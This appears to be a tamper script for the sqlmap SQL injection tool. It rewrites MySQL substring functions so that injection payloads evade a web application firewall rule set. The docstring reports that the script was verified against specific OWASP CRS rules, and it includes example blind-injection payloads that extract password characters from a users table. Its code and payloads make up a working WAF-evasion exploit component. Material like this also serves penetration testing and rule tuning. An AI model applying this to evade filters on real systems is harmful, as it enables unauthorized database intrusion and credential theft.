#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces (MySQL) instances like 'MID(A, B, C)' with 'RIGHT(LEFT(A, B+C-1), C)' counterpart

    Requirement:
        * MySQL
        * MariaDB

    Tested against:
        * MySQL 5.5.62, 5.7.44, 8.0.36, 8.0.46, 8.4.9, 9.4.0
        * Percona 8.0.46
        * MariaDB 10.7.8, 10.11.14, 11.4.12, 11.8.8, 12.0.2

    Notes:
        * Useful to bypass web application firewalls, as the OWASP CRS rule 942151 (added in
          CRS v4) blacklists a long list of SQL function names, MID, SUBSTR and SUBSTRING
          among them, while LEFT and RIGHT are not on that list
        * Verified against ModSecurity v3 with the OWASP CRS v4.25.0 (paranoia level 1,
          blocking mode), where 'LEFT((SELECT pw FROM users LIMIT 1),1)=0x73' and
          'RIGHT(LEFT((SELECT pw FROM users LIMIT 1),3),1)=0x63' are both answered with
          HTTP 200 and still work on all tested engines
        * Note that ORD() and ASCII() are on that same blacklist, so payload shapes comparing
          the extracted character directly (rather than its code point) are the ones helped
        * Existing tamper script 'substring2leftright' does not apply here, as it only
          rewrites the PostgreSQL 'SUBSTRING(A FROM B FOR C)' spelling
        * Combine it with tamper script 'castprefix' to also clear rule 942360, e.g.
          --tamper=mid2leftright,castprefix

    >>> tamper('MID(pw, 1, 1)')
    'RIGHT(LEFT(pw, 1), 1)'
    >>> tamper('SUBSTRING(pw, 2, 3)')
    'RIGHT(LEFT(pw, 4), 3)'
    >>> tamper('1 AND SUBSTR((SELECT pw FROM users LIMIT 1),1,1)=0x73')
    '1 AND RIGHT(LEFT((SELECT pw FROM users LIMIT 1),1),1)=0x73'
    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    def _(match):
        pos, length = match.group("pos").strip(), match.group("len").strip()

        if pos.isdigit() and length.isdigit():
            end = str(int(pos) + int(length) - 1)
        else:
            end = "%s+%s-1" % (pos, length)

        return "RIGHT(LEFT(%s,%s%s),%s%s)" % (match.group("expr"), match.group("sp1"), end, match.group("sp2"), length)

    return re.sub(r"(?i)\b(?:MID|SUBSTRING|SUBSTR)\(\s*(?P<expr>(?:[^()]|\([^()]*\))+?)\s*,(?P<sp1>\s*)(?P<pos>[^,()]+),(?P<sp2>\s*)(?P<len>[^,()]+)\)", _, payload) if payload else payload
